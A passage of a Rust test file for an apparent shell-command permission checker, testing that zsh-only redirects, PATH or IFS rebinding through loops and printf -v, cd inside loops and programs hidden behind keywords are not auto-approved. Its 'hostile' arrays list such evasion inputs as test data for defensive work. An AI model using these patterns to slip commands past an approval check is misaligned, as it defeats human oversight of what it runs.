        keys.run.iter().any(|k| k.starts_with("shell:touch")),
        "{keys:?}"
    );
}

/// A redirect only zsh spells (`>!`, `>&|`, `&>|`) writes somewhere the
/// other shells do not, so a line with one is not read.
#[test]
fn a_redirect_only_one_shell_has_is_not_read() {
    let run = Run::new();
    let hostile = ["echo x >&| cat", "echo x &>| ls", "echo x &>! ls"];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    assert_eq!(
        run.prompted(&["echo x > /dev/null 2>&1"]),
        Vec::<&str>::new()
    );
}

/// A loop header and `printf -v` bind a variable like any assignment, and
/// are named for it. An ordinary lower-case loop variable is the exception:
/// no shell and no program reads one.
#[test]
fn a_variable_bound_without_an_assignment_is_named() {
    let mut run = Run::new();
    let hostile = [
        "for PATH in tools; do ls; done",
        "for path in tools; do ls; done",
        "for IFS in x; do ls; done",
        "for a PATH in x tools; do ls; done",
        "select PATH in tools; do ls; done",
        "printf -v PATH %s tools; ls",
        "printf -vPATH %s tools; ls",
        "cat <<EOF\n${PATH:=tools}\nEOF\nls",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let keys = run.approve_for_run("for PATH in tools; do ls; done");
    assert_eq!(keys.run, ["shell:env:PATH"]);
    let harmless = [
        "for d in src docs; do test -e \"$d\" && echo \"$d\"; done",
        "printf '%s\\n' -v x",
        "printf -- -v",
        "cat <<EOF\nname=${USER}\nEOF",
    ];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

/// A `cd` inside a loop moves the shell for every pass after it, so the
/// commands before it run somewhere the line does not say.
#[test]
fn a_cd_after_a_loop_has_started_is_not_followed() {
    let run = Run::new();
    let hostile = [
        "for i in 1 2; do cat link/hosts; cd sub; done",
        "while test -e src; do cat link/hosts; cd sub; done",
        "until cd sub; do cat link/hosts; done",
        "for d in src docs; do cd \"$d\" && cat main.rs; done",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let harmless = ["cd src && for f in main.rs; do cat \"$f\"; done"];
    assert_eq!(run.prompted(&harmless), Vec::<&str>::new());
}

/// A word that reads as a keyword or a quiet builtin does not hide the
/// program that follows it in the same command.
#[test]
fn a_program_behind_a_keyword_is_still_named() {
    let run = Run::new();
    let hostile = [
        "set -- a; for x do touch marker; done",
        "set -- a; for PATH do touch marker; done",
        "jobs -x touch marker",
        "jobs -lx touch marker",
    ];
    assert_eq!(run.unprompted(&hostile), Vec::<&str>::new());
    let keys = run.asks("set -- a; for x do touch marker; done");
    assert_eq!(keys.run, ["shell:touch marker"]);
}
